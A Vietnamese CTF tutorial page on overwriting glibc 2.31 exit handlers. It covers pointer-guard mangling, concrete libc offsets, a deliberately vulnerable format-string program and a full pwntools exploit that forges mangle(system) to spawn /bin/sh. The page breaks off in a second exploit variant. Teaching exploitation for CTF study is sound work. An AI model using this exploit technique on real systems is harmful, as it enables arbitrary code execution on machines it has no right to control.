@@ -1,0 +1,522 @@
+<title>Exit Handlers</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:120px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.mcalc{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.mcalc label{font-family:var(--font-mono);font-size:12px;color:var(--muted);display:block;margin:8px 0 4px}
+.mcalc input{font-family:var(--font-mono);font-size:14px;padding:7px 10px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);width:100%}
+.mcalc .chk{display:flex;gap:8px;align-items:center;margin-top:10px;font-family:var(--font-mono);font-size:13px}
+.mcalc .out{margin-top:14px;font-family:var(--font-mono);font-size:13px;display:flex;flex-direction:column;gap:6px}
+.mcalc .ro{display:flex;justify-content:space-between;gap:10px;border:1px solid var(--line);border-radius:7px;padding:8px 11px;background:var(--surface)}
+.mcalc .ro b{color:var(--accent)}.mcalc .ro.res{background:var(--mem-soft);border-color:var(--mem)}.mcalc .ro.res b{color:var(--mem)}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}.reqitem.must{border-left:3px solid var(--danger)}.reqitem.help{border-left:3px solid var(--mem)}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 3 · Bài 17</div>
+    <h1>Exit Handlers</h1>
+    <p class="sub">Khi chương trình <code>exit()</code> (hay return khỏi main), glibc chạy danh sách "hàm dọn dẹp" — <strong>con trỏ hàm trong vùng dữ liệu ghi được của libc</strong>. Ghi đè một con trỏ đó → chuyển hướng luồng lúc thoát. Đích lý tưởng khi <strong>GOT đã khóa (Full RELRO)</strong>. Bài này đi <strong>struct số thật glibc 2.31</strong> + công thức mangle tính cụ thể.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31</span>
+      <span class="chip"><b>Cần trước:</b> write primitive, leak libc</span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Struct</a><a href="#s4">04 Mangle</a><a href="#s5">05 Máy tính</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Cơ chế:</strong> <code>exit()</code> gọi <code>__run_exit_handlers</code>, duyệt danh sách <mark>__exit_funcs</mark> và gọi từng con trỏ hàm (hàm <code>atexit</code>, destructor). Danh sách nằm trong <strong>vùng data ghi được của libc</strong> (biến <code>initial</code>) — không bị Full RELRO khóa.</p>
+    <p><strong>Khai thác:</strong> ghi đè con trỏ hàm trong danh sách = redirect luồng khi thoát. Vì <code>exit</code>/return-from-main gần như <em>luôn</em> chạy, đích rất tin cậy.</p>
+    <p><strong>Rào:</strong> con trỏ bị <mark>mã hóa (PTR_MANGLE)</mark>: <code>stored = rol(target ⊕ guard, 0x11)</code>, <code>guard</code> = <code>fs:0x30</code> (pointer_guard, ngẫu nhiên mỗi tiến trình). Cần <strong>leak guard</strong> (hoặc ghi guard=0) để forge.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>Full RELRO khóa GOT → ghi con trỏ exit handler thay; nhớ nó bị mangle (cần guard fs:0x30).</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — đọc khi đang thi, bắt tay giải liền</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🚩 Khi nào dùng</span>
+        <p>Có <b>write-tùy-ý</b> (fmt/OOB/heap) + leak libc · <b>Full RELRO</b> (GOT read-only) · chương trình sẽ <code>exit()</code>/return. → ghi exit handler.</p></div>
+      <div class="combat-row"><span class="lab">🔢 Offset thật 2.31</span>
+<pre><code>initial         = libc + 0x1ed660   <span class="c"># exit_function_list đầu</span>
+__exit_funcs    = libc + 0x1ed658   <span class="c"># con trỏ tới initial</span>
+fns[0].fn       = initial + 0x18    <span class="c"># = libc+0x1ed678 (mangled)</span>
+pointer_guard   = fs:0x30           <span class="c"># leak hoặc ghi 0</span></code></pre></div>
+      <div class="combat-row"><span class="lab">✅ Hai hướng</span>
+        <p><b>(a) Biết guard</b>: forge <code>stored = rol(target ⊕ guard, 0x11)</code>, ghi vào <code>fns[0].fn</code>. <b>(b) Zero guard</b>: ghi <code>fs:0x30 = 0</code> trước → <code>stored = rol(target, 0x11)</code>, khỏi leak guard.</p></div>
+      <div class="combat-row"><span class="lab">⚡ Skeleton</span>
+<pre><code>guard = leak_fs_0x30
+def mangle(t):
+    v = t ^ guard
+    return ((v&lt;&lt;0x11)|(v&gt;&gt;(64-0x11))) &amp; (2**64-1)
+write(libc.address+0x1ed678, p64(mangle(win)))   <span class="c"># fns[0].fn</span>
+<span class="c"># đảm bảo fns[0].flavor = 4 (ef_cxa), idx ≥ 1</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Kẹt thì xem</span>
+        <p>Quên mangle → nhảy rác · flavor ≠ 4 → không gọi · idx=0 → không duyệt · guard sai → mangle sai. Offset khác version → <code>disassemble __run_exit_handlers</code>.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Điều gì chạy khi <code>exit()</code></h2>
+  <h3>atexit &amp; __run_exit_handlers</h3>
+  <p>C cho phép đăng ký "hàm dọn dẹp" chạy khi thoát: <code>atexit(f)</code>, destructor thư viện, <code>__cxa_atexit</code>… glibc lưu chúng vào danh sách liên kết <span class="mem-term">__exit_funcs</span> (mỗi node là <code>exit_function_list</code> chứa mảng <code>exit_function</code>). Khi <code>exit()</code> chạy, <code>__run_exit_handlers</code> <strong>duyệt danh sách và gọi từng con trỏ hàm</strong>. Return khỏi <code>main</code> cũng dẫn tới đây (qua <code>__libc_start_main</code>).</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">__exit_funcs</div><p>Con trỏ tới danh sách hàm exit; mặc định trỏ <code>initial</code> (trong libc bss).</p></div>
+    <div class="card"><div class="term">initial</div><p>exit_function_list tĩnh trong libc; node đầu của danh sách.</p></div>
+    <div class="card"><div class="term">flavor</div><p>Loại entry: 4 = ef_cxa (gọi fn(arg)), 3 = ef_on, 0 = ef_free (bỏ qua).</p></div>
+    <div class="card"><div class="term">PTR_MANGLE</div><p>Mã hóa con trỏ: rol(ptr ⊕ guard, 0x11).</p></div>
+    <div class="card"><div class="term">pointer_guard</div><p>Khóa ngẫu nhiên tại fs:0x30 (TLS).</p></div>
+    <div class="card"><div class="term">Full RELRO</div><p>Khóa GOT binary (KHÔNG khóa data libc → exit handler ghi được).</p></div>
+  </div>
+  <h3>Pointer mangling — rào chắn</h3>
+  <p>glibc không lưu con trỏ hàm exit "trần" mà <strong>mã hóa</strong> để chống chính kiểu tấn công này:</p>
+  <pre><code>stored    = rol( target ⊕ guard , <span class="d">0x11</span> )   <span class="c">; khi ĐĂNG KÝ (PTR_MANGLE)</span>
+gọi(x)    : target = ror(stored, <span class="d">0x11</span>) ⊕ guard  <span class="c">; khi CHẠY (PTR_DEMANGLE)</span></code></pre>
+  <div class="note warn"><span class="tag">Version</span>Offset struct &amp; chi tiết mangling thay đổi theo glibc. Luôn kiểm <code>disassemble __run_exit_handlers</code> và cấu trúc <code>initial</code>/<code>__exit_funcs</code> trong gdb cho đúng bản. Bài dùng <strong>glibc 2.31</strong> làm mẫu số thật.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Khi GOT bị khóa</h2>
+  <p>Format string / OOB / heap cho bạn "ghi giá trị vào địa chỉ". Đích quen thuộc là <strong>GOT</strong> (ghi = system). Nhưng <strong>Full RELRO</strong> làm GOT read-only → ghi GOT crash. Lúc đó bạn cần một <em>con trỏ hàm khác, ghi được</em>, chắc chắn được gọi.</p>
+  <p>Exit handler đúng là vậy: con trỏ hàm trong data libc (ghi được), gọi khi thoát. Cùng với <a href="fsop.html">FSOP</a> (con trỏ trong struct FILE), đây là hai đích "post-GOT" chính của CTF hiện đại. Khác biệt: exit handler bị mangle (cần guard), FSOP không.</p>
+ </div>
+</section>
+
+<!-- 03 Struct -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / STRUCT · MỤC LÕI</div>
+  <h2>Danh sách exit, từng byte (số thật 2.31)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 680 128" role="img" aria-label="exit gọi __run_exit_handlers, duyệt __exit_funcs tới entry có con trỏ fn mangled; ta ghi fn = mangle(target) để redirect" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs><marker id="ar" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+    <rect x="8" y="40" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <text x="83" y="60" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">exit() / ret main</text>
+    <text x="83" y="76" font-size="10.5" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">__run_exit_handlers</text>
+    <rect x="190" y="40" width="170" height="46" rx="8" stroke-width="1.5" stroke="var(--mem)"/>
+    <text x="275" y="60" font-size="12" text-anchor="middle" fill="var(--mem)" stroke="none">__exit_funcs → initial</text>
+    <text x="275" y="76" font-size="10.5" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">data libc, ghi được</text>
+    <rect x="392" y="40" width="160" height="46" rx="8" stroke-width="1.7" stroke="#e8663e"/>
+    <text x="472" y="60" font-size="12" text-anchor="middle" fill="#e8663e" stroke="none">fns[0].fn (mangled)</text>
+    <text x="472" y="76" font-size="10.5" text-anchor="middle" fill="#e8663e" stroke="none">← ghi mangle(target)</text>
+    <rect x="584" y="40" width="88" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="628" y="63" font-size="12" text-anchor="middle" fill="#e8663e" stroke="none">target()</text>
+    <line x1="158" y1="63" x2="186" y2="63" stroke="currentColor" stroke-width="1.5" marker-end="url(#ar)"/>
+    <line x1="360" y1="63" x2="388" y2="63" stroke="currentColor" stroke-width="1.5" marker-end="url(#ar)"/>
+    <line x1="552" y1="63" x2="580" y2="63" stroke="#e8663e" stroke-width="1.6" marker-end="url(#ar)"/>
+    <text x="340" y="116" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.7">demangle(fns[0].fn) = target → gọi target(arg). Ta ghi fns[0].fn = mangle(target).</text>
+  </svg>
+  <figcaption>exit → duyệt danh sách → gọi con trỏ (sau demangle). Ta ghi con trỏ = mangle(target). Cam = phần ta ghi.</figcaption>
+  </figure>
+
+  <h3>Bảng-byte: initial (struct exit_function_list) @ libc+0x1ed660</h3>
+  <div class="frame">
+    <div class="fr"><span class="o">+0x00</span><span><code>next</code> = con trỏ node kế (NULL nếu chỉ 1 node)</span></div>
+    <div class="fr"><span class="o">+0x08</span><span><code>idx</code> = số entry trong node (phải ≥ 1 để fns[0] được duyệt)</span></div>
+    <div class="fr"><span class="o">+0x10</span><span><code>fns[0].flavor</code> = 4 (ef_cxa) → glibc gọi <code>fn(arg, dso)</code></span></div>
+    <div class="fr key"><span class="o">+0x18</span><span><b>fns[0].fn</b> = con trỏ MANGLED ← đích ghi (= libc+0x1ed678)</span></div>
+    <div class="fr"><span class="o">+0x20</span><span><code>fns[0].arg</code> = tham số truyền cho fn (rdi khi gọi)</span></div>
+    <div class="fr"><span class="o">+0x28</span><span><code>fns[0].dso_handle</code></span></div>
+  </div>
+  <div class="note tip"><span class="tag">Mẹo arg</span>Vì flavor=4 gọi <code>fn(arg)</code>, nếu đặt <code>target = system</code> và <code>fns[0].arg = &amp;"/bin/sh"</code> → <code>system("/bin/sh")</code> trực tiếp (giống free_hook trick). Ghi cả fn (mangled system) lẫn arg.</div>
+
+  <h3>Công thức forge (số thật)</h3>
+  <pre><code><span class="c"># target = system = libc+0x52290 ; guard = fs:0x30 (leak)</span>
+stored = rol( (system ⊕ guard) , <span class="d">0x11</span> )
+<span class="c"># ghi stored vào libc+0x1ed678 ; ghi &amp;"/bin/sh" vào libc+0x1ed680 (arg)</span>
+<span class="c"># nếu zero-guard: stored = rol(system, 0x11)</span></code></pre>
+ </div>
+</section>
+
+<!-- 04 Mangle -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / POINTER GUARD</div>
+  <h2>Lấy guard: leak hay zero</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Leak guard (fs:0x30)</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x *(unsigned long*)($fs_base+<span class="d">0x30</span>)   <span class="c"># pointer_guard</span>
+<span class="c"># khai thác: leak qua cùng primitive (fmt %p nếu guard lọt stack, hay arbitrary read TLS)</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Hoặc ghi guard = 0</h4>
+    <pre><code><span class="c"># nếu có write-tùy-ý: ghi 0 vào fs:0x30 (địa chỉ TLS, thường gần stack)</span>
+<span class="c"># → mangling thành rol(target,0x11) — khỏi leak guard</span></code></pre></div></div>
+  <div class="note warn"><span class="tag">Hai bẫy</span>① guard nằm trong TLS (<code>fs:0x30</code>) — địa chỉ tuyệt đối khó đoán nếu không leak stack/TLS. ② Zero-guard cần ghi được đúng ô TLS đó. Thường leak guard dễ hơn nếu có fmt/arbitrary-read.</div>
+ </div>
+</section>
+
+<!-- 05 Máy tính -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Máy tính mangle con trỏ</h2>
+  <p>Nhập <code>target</code> (đích muốn nhảy) và <code>guard</code> để ra giá trị cần ghi vào <code>fns[0].fn</code>. Bật "guard = 0" để thấy trường hợp zero-guard.</p>
+  <div class="lab">
+    <div class="mcalc">
+      <label>target (địa chỉ muốn chạy khi exit, vd system = 0x7ffff7e12290):</label>
+      <input id="mT" value="0x7ffff7e12290" autocomplete="off">
+      <label>guard (fs:0x30, leak được):</label>
+      <input id="mG" value="0x5c3a1b9e4d7f0028" autocomplete="off">
+      <div class="chk"><input type="checkbox" id="mZero"> <label for="mZero" style="margin:0;color:var(--fg)">guard = 0 (đã ghi fs:0x30=0)</label></div>
+      <div class="out" id="mOut"></div>
+    </div>
+  </div>
+  <p class="lab-sub">stored = rol(target ⊕ guard, 0x11). Ghi "stored" vào <code>fns[0].fn</code> (libc+0x1ed678) → khi exit, demangle ra đúng target.</p>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Địa chỉ &amp; guard</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>__exit_funcs &amp; entry</h4>
+    <pre><code><span class="p">(gdb)</span> p &amp;__exit_funcs        <span class="c"># libc+0x1ed658</span>
+<span class="p">(gdb)</span> p *__exit_funcs         <span class="c"># next, idx, fns[]</span>
+<span class="p">(gdb)</span> disassemble __run_exit_handlers  <span class="c"># xem mangling &amp; offset thực tế</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Guard</h4>
+    <pre><code><span class="p">(gdb)</span> p/x *(unsigned long*)($fs_base+<span class="d">0x30</span>)</code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Tính stored</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> rol = <span class="k">lambda</span> v,n:((v&lt;&lt;n)|(v&gt;&gt;(<span class="d">64</span>-n)))&amp;(<span class="d">2</span>**<span class="d">64</span>-<span class="d">1</span>)
+<span class="p">&gt;&gt;&gt;</span> stored = rol(system ^ guard, <span class="d">0x11</span>)</code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Full RELRO + fmt write → exit handler → shell (glibc 2.31)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -z relro -z now  (Full RELRO → GOT khóa)</span>
+<span class="k">int</span> main(){ <span class="k">char</span> buf[<span class="d">0x100</span>];
+  <span class="k">for</span>(<span class="k">int</span> i=<span class="d">0</span>;i&lt;<span class="d">3</span>;i++){ fgets(buf,<span class="d">0x100</span>,stdin); printf(buf); }  <span class="c">// fmt, 3 lần</span>
+  <span class="k">return</span> <span class="d">0</span>;   <span class="c">// ← return → chạy exit handlers</span>
+}</code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — leak libc + guard, forge mangle(system), ghi fns[0].fn + arg bằng fmt.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+rol = <span class="k">lambda</span> v,n:((v&lt;&lt;n)|(v&gt;&gt;(<span class="d">64</span>-n)))&amp;(<span class="d">2</span>**<span class="d">64</span>-<span class="d">1</span>)
+
+<span class="c"># vòng 1: leak libc (ô %21$p) và guard (ô chứa fs:0x30 trên stack, dò bằng %N$p)</span>
+p.sendline(b<span class="s">"%21$p|%POS_GUARD$p"</span>)
+a,b = p.recvline().split(b<span class="s">"|"</span>)
+libc.address = <span class="k">int</span>(a,<span class="d">16</span>) - <span class="d">0x24083</span>        <span class="c"># __libc_start_main+243</span>
+guard        = <span class="k">int</span>(b,<span class="d">16</span>)
+log.success(<span class="s">f"libc={hex(libc.address)} guard={hex(guard)}"</span>)
+
+fn_addr  = libc.address + <span class="d">0x1ed678</span>          <span class="c"># fns[0].fn</span>
+arg_addr = libc.address + <span class="d">0x1ed680</span>          <span class="c"># fns[0].arg</span>
+system   = libc.sym.system
+binsh    = <span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>))
+stored   = rol(system ^ guard, <span class="d">0x11</span>)
+
+<span class="c"># vòng 2: ghi fns[0].fn = mangle(system) ; fns[0].arg = &amp;"/bin/sh"</span>
+p.sendline(fmtstr_payload(<span class="d">6</span>, {fn_addr: stored, arg_addr: binsh}))
+
+<span class="c"># vòng 3 / return → __run_exit_handlers → system("/bin/sh")</span>
+p.sendline(b<span class="s">"id"</span>)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Vị trí ô leak guard (<code>%POS_GUARD$</code>) &amp; offset <code>0x1ed678</code>/<code>0x24083</code> là của <b>glibc 2.31 Ubuntu 20.04</b> — xác nhận bằng gdb cho libc đề. Phải đảm bảo <code>fns[0].flavor=4</code> và <code>idx≥1</code> (thường initial có sẵn 1 entry atexit). Nếu không, cũng ghi flavor=4, idx=1.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools: fmtstr_payload ghi fn+arg, rol helper.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+rol = <span class="k">lambda</span> v,n:((v&lt;&lt;n)|(v&gt;&gt;(<span class="d">64</span>-n)))&amp;(<span class="d">2</span>**<span class="d">64</span>-<span class="d">1</span>)
+<span class="c"># ... leak libc + guard (như A) ...</span>
+stored = rol(libc.sym.system ^ guard, <span class="d">0x11</span>)
